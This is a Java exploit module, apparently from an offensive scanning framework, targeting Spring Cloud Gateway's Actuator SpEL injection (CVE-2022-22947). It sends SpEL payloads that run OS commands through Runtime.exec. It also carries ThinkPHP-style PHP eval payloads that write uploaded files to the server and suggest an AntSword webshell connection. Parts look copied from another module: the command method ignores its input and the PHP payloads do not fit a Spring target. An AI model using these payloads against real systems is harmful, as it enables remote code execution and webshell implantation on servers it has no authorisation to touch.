package fun.fireline.others;
/**
 * @author zq
 * @date 2021/4/3 23:20
 * @github https://github.com/zq0
 *
 *  Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)
 *  Spring表达式注入漏洞
 */
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.util.Base64;
import java.util.HashMap;
public class CVE_2022_22947 implements ExploitInterface {
    private String target = null;
    private HashMap<String, String> header1 = new HashMap();
    private HashMap<String, String> header2 = new HashMap();

    private boolean isVul = false;

    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
//     headers1 = {
//                'Accept-Encoding': 'gzip, deflate',
//                'Accept': '*/*',
//                'Accept-Language': 'en',
//                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
//                'Content-Type': 'application/json'
//    }
//
//        headers2 = {
//                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
//                'Content-Type': 'application/x-www-form-urlencoded'
//    }
//
        this.header1.put("Accept-Encoding", "gzip, deflate");
        this.header1.put("Accept", "*/*");
        this.header1.put("Accept-Language", "en");
        this.header1.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
        this.header1.put("Content-type", "application/json");

        this.header2.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
        this.header2.put("Content-Type", "application/x-www-form-urlencoded");
        this.target = url;

        String check_payload = String.format("{\n" +
                "  \"id\": \"hacktest\",\n" +
                "  \"filters\": [{\n" +
                "    \"name\": \"AddResponseHeader\",\n" +
                "    \"args\": {\n" +
                "      \"name\": \"Result\",\n" +
                "      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"\n" +
                "    }\n" +
                "  }],\n" +
                "  \"uri\": \"http://example.com\"\n" +
                "}");

        // get 请求，根据不同的exp，可能需要不同的请求方式，看需更改
        Response response1 = HttpTools.post(this.target + "/actuator/gateway/routes/hacktest", check_payload, this.header1, "UTF-8");
        Response response2 = HttpTools.post(this.target + "/actuator/gateway/refresh", "1", this.header2, "UTF-8");
        Response response3 = HttpTools.get(this.target + "/actuator/gateway/routes/hacktest", this.header2, "UTF-8");
        Response response4 = HttpTools.delete(this.target + "/actuator/gateway/routes/hacktest", this.header2, "UTF-8");
        Response response5 = HttpTools.post(this.target + "/actuator/gateway/refresh", "1", this.header2, "UTF-8");
        String result = response3.getText();

        JSONObject object = JSONObject.parseObject(result);
        result = object.getString("filters");
        if(response3.getText() != null  && response3.getText().contains("AddResponseHeader Result")) {
            this.isVul = true;
            return "[+] 目标存在Spring-Gateway-" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~"+result;
        } else if (response3.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response3.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }


    }


    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String payload = String.format("{\n" +
                "  \"id\": \"pentest\",\n" +
                "\"uri\": \"http://127.0.0.1:8000\",\n" +
                "\"predicates\": [\n" +
                "        {\n" +
                "          \"name\": \"Method\",\n" +
                "          \"args\": {\n" +
                "            \"_genkey_0\": \"GET\"\n" +
                "          }\n" +
                "        },\n" +
                "        {\n" +
                "          \"name\": \"Path\",\n" +
                "          \"args\": {\n" +
                "            \"_genkey_0\": \"/pentest\"\n" +
                "          }\n" +
                "        }\n" +
                "      ],\n" +
                "  \"filters\": [\n" +
                "    {\n" +
                "      \"name\": \"AddResponseHeader\",\n" +
                "      \"args\": {\n" +
                "        \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"cmd\\\",\\\"/c\\\",\\\"whoami\\\"}).getInputStream())).replaceAll(\\\"\\\\n\\\",\\\"\\\")}\",\n" +
                "    \"name\": \"X-Request-Foo\"\n" +
                "      }     \n" +
                "    }\n" +
                "  ]\n" +
                "}",cmd);
        this.header1.put("Accept-Encoding", "gzip, deflate");
        this.header1.put("Accept", "*/*");
        this.header1.put("Accept-Language", "en");
        this.header1.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
        this.header1.put("Content-type", "application/json");

        this.header2.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
        this.header2.put("Content-Type", "application/x-www-form-urlencoded");
        // 替换payload 中的 payload 字符为要执行的命令

        payload = payload.replace("payload", cmd);

        Response response1 = HttpTools.post(this.target + "/actuator/gateway/routes/hacktest", payload, this.header1, "UTF-8");
        Response response2 = HttpTools.post(this.target + "/actuator/gateway/refresh", "1", this.header2, "UTF-8");
        Response response3 = HttpTools.get(this.target + "/actuator/gateway/routes/hacktest", this.header2, "UTF-8");
        Response response4 = HttpTools.delete(this.target + "/actuator/gateway/routes/hacktest", this.header2, "UTF-8");
        Response response5 = HttpTools.post(this.target + "/actuator/gateway/refresh", "1", this.header2, "UTF-8");
        String result = response3.getText();
        JSONObject object = JSONObject.parseObject(result);
        result = object.getString("filters");


        return result;
    }

    // 获取当前的web路径，有最好，没有也无所谓
    @Override
    public String getWebPath() {
        String payload = "/index.php?s=/index/index/name/${@print(realpath(__ROOT__))}";
        Response response = HttpTools.get(this.target + payload, this.header1, "UTF-8");

        // 这个payload会把 html网页也给输出，这里分割简单去除一下
        return Tools.regReplace(response.getText());

    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        String result = "";
        // 对文件 base64 编码
        String base64Data = Base64.getEncoder().encodeToString(fileContent.getBytes());
        // 注意一下，需要对 base64 编码后的在进行一次url编码，
        base64Data = URLEncoder.encode(base64Data, "UTF-8" );

        String payload = "/index.php?s=/sd/iex/xxx/${@eval($_GET[x])}&x=file_put_contents('" + filename + "',base64_decode('" + base64Data + "'));";

        Response response = HttpTools.get(this.target + payload, this.header1, "UTF-8");

        if (response.getError() == null) {
            // 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功
            response = HttpTools.get(this.target + "/" + filename, this.header1, "UTF-8");
            result = "上传成功! 路径： " + this.target + "/" + filename;
        } else {
            result =  "上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/${${@eval($_POST[1])}}";
        }

        return result;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
